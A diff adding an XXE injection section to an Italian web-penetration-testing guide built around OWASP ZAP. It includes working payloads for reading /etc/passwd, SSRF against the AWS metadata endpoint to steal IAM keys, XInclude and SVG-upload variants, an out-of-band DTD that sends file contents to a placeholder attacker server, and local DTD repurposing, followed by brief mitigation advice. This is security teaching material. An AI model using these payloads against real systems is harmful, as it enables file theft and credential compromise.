@@ -66,6 +66,12 @@ L'obiettivo è dimostrare un approccio "tool-agnostic" allo sfruttamento delle v
         *   [9.3 Evasione delle Difese SSRF (Bypass Techniques)](#93-evasione-delle-difese-ssrf-bypass-techniques)
         *   [9.4 Blind SSRF Vulnerabilities e Interazioni Out-Of-Band (OAST)](#94-blind-ssrf-vulnerabilities-e-interazioni-out-of-band-oast)
         *   [9.5 Prevenzione e Mitigazione](#95-prevenzione-e-mitigazione)
+    *   [10. XML External Entity (XXE) Injection](#10-xml-external-entity-xxe-injection)
+        *   [10.1 Sfruttamento Classico: Recupero File e SSRF](#101-sfruttamento-classico-recupero-file-e-ssrf)
+        *   [10.2 Superfici di Attacco Nascoste](#102-superfici-di-attacco-nascoste)
+        *   [10.3 Blind XXE e OAST (Out-Of-Band Data Exfiltration)](#103-blind-xxe-e-oast-out-of-band-data-exfiltration)
+        *   [10.4 Error-Based Blind XXE & Local DTD Repurposing](#104-error-based-blind-xxe--local-dtd-repurposing)
+        *   [10.5 Prevenzione e Mitigazione](#105-prevenzione-e-mitigazione)
 *   [Parte 2: Client-Side Vulnerabilities](#parte-2-client-side-vulnerabilities)
 *   [Parte 3: Advanced Topics](#parte-3-advanced-topics)
 *   [Appendice: OWASP ZAP Automation Scripts](#appendice-owasp-zap-automation-scripts)
@@ -654,7 +660,95 @@ Per prevenire gli attacchi SSRF, è raccomandato un approccio a più livelli (De
 
 ---
 
-*(Le sezioni da 10 a 14 sono in fase di stesura...)*
+### 10. XML External Entity (XXE) Injection
+
+L'XML External Entity Injection (XXE) è una vulnerabilità che consente a un attaccante di interferire con l'elaborazione dei dati XML da parte dell'applicazione. Poiché i parser XML standard supportano di default funzionalità legacy pericolose, un attaccante può definire "Entità Esterne" per leggere file sul server, eseguire Server-Side Request Forgery (SSRF) o esfiltrare dati sensibili.
+
+#### 10.1 Sfruttamento Classico: Recupero File e SSRF
+Per sfruttare una XXE di base, occorre iniettare un elemento `DOCTYPE` che definisca un'entità esterna e richiamarla all'interno di uno dei nodi XML restituiti nella risposta HTTP.
+
+**1. Recupero di File Locali:**
+Se un'applicazione accetta XML per controllare le scorte, si intercetta la richiesta (tramite ZAP Requester) e si inietta il payload:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+```
+L'applicazione parserà l'entità `&xxe;`, sostituendola con il contenuto del file richiesto e mostrandolo nella risposta (es. *"Invalid product ID: root:x:0:0..."*).
+
+**2. Esecuzione di SSRF via XXE:**
+La stessa logica può essere usata per colpire endpoint interni (SSRF). Ad esempio, in un ambiente cloud AWS, è possibile interrogare l'endpoint dei metadati EC2 per rubare le chiavi IAM:
+```xml
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "[http://169.254.169.254/latest/meta-data/iam/security-credentials/admin](http://169.254.169.254/latest/meta-data/iam/security-credentials/admin)"> ]>
+```
+
+#### 10.2 Superfici di Attacco Nascoste
+Spesso l'applicazione non sembra accettare XML o non permette di dichiarare un `DOCTYPE` completo.
+
+**1. Attacchi XInclude:**
+Se l'input dell'utente viene incorporato in un documento XML lato server (es. richieste SOAP), non è possibile definire un `DOCTYPE`. Tuttavia, si può usare la direttiva `XInclude` per richiamare file esterni.
+```xml
+<foo xmlns:xi="[http://www.w3.org/2001/XInclude](http://www.w3.org/2001/XInclude)">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+**2. XXE tramite Upload di Immagini (SVG):**
+Formati di file come SVG (Scalable Vector Graphics) sono basati su XML. Anche se il form si aspetta una foto profilo (PNG/JPEG), caricando un file `.svg` contenente un payload XXE, le librerie di elaborazione immagini del server (es. Apache Batik) potrebbero parsare l'XML e renderizzare il testo rubato direttamente sull'immagine:
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg)" xmlns:xlink="[http://www.w3.org/1999/xlink](http://www.w3.org/1999/xlink)" version="1.1">
+<text font-size="16" x="0" y="16">&xxe;</text></svg>
+```
+
+**3. Modifica del Content-Type:**
+Applicazioni progettate per ricevere dati in formato `application/x-www-form-urlencoded` potrebbero tollerare anche il formato `text/xml`. Tramite ZAP, basta convertire il body della POST in XML e cambiare il `Content-Type` per sbloccare la vulnerabilità.
+
+#### 10.3 Blind XXE e OAST (Out-Of-Band Data Exfiltration)
+Nelle vulnerabilità Blind XXE, il server non restituisce l'output dell'entità nella risposta HTTP. L'estrazione dei dati avviene forzando il parser XML a inviare i file a un server controllato dall'attaccante (es. ZAP OAST o Interactsh).
+
+Poiché molti parser vietano l'uso di entità esterne all'interno della definizione di altre entità in un DTD interno, l'attaccante deve ospitare un file DTD malevolo sul proprio server e richiamarlo.
+
+**1. Creare e ospitare il DTD Malevolo (`malicious.dtd`):**
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '[http://tuo-server-oast.com/?x=%file](http://tuo-server-oast.com/?x=%file);'>">
+%eval;
+%exfil;
+```
+*Nota:* Vengono utilizzate le Entità Parametro (identificate dal simbolo `%`). L'entità `eval` crea dinamicamente l'entità `exfil`, che allega il contenuto del file all'URL.
+
+**2. Richiamare il DTD tramite l'applicazione vulnerabile:**
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "[http://tuo-server-oast.com/malicious.dtd](http://tuo-server-oast.com/malicious.dtd)"> %xxe;]>
+```
+
+#### 10.4 Error-Based Blind XXE & Local DTD Repurposing
+Se il server blocca le connessioni in uscita (impedendo il recupero del DTD malevolo), ma mostra i messaggi di errore del parser XML, si può usare l'**Error-Based XXE**. Si forza un errore cercando di caricare un file inesistente il cui nome è il contenuto del file rubato.
+
+Se le connessioni remote sono bloccate, si utilizza una tecnica avanzata: il **Repurposing di un DTD Locale**. Sfruttando un file DTD già presente nel filesystem del server (es. `docbookx.dtd` su ambienti GNOME Linux), si ridefinisce una sua entità esistente (es. `ISOamso`) sovrascrivendola con il payload di errore:
+```xml
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
+Il parser importerà il DTD locale, eseguirà il nostro override e cercherà di aprire il file `/nonexistent/root:x:0...`, facendoci leggere l'output nel messaggio di errore (es. *"java.io.FileNotFoundException"*).
+
+#### 10.5 Prevenzione e Mitigazione
+La causa principale delle vulnerabilità XXE è il supporto abilitato di default alle entità esterne nei parser XML standard (es. DOM, SAX).
+*   Disabilitare esplicitamente la risoluzione delle *External Entities* (XXE) e la direttiva *XInclude* nella configurazione del parser XML utilizzato dall'applicazione.
+*   Se possibile, privilegiare formati di interscambio dati meno complessi (come JSON) rispetto all'XML.
+
+---
+
+*(Le sezioni da 11 a 14 sono in fase di stesura...)*
 
 ---
 
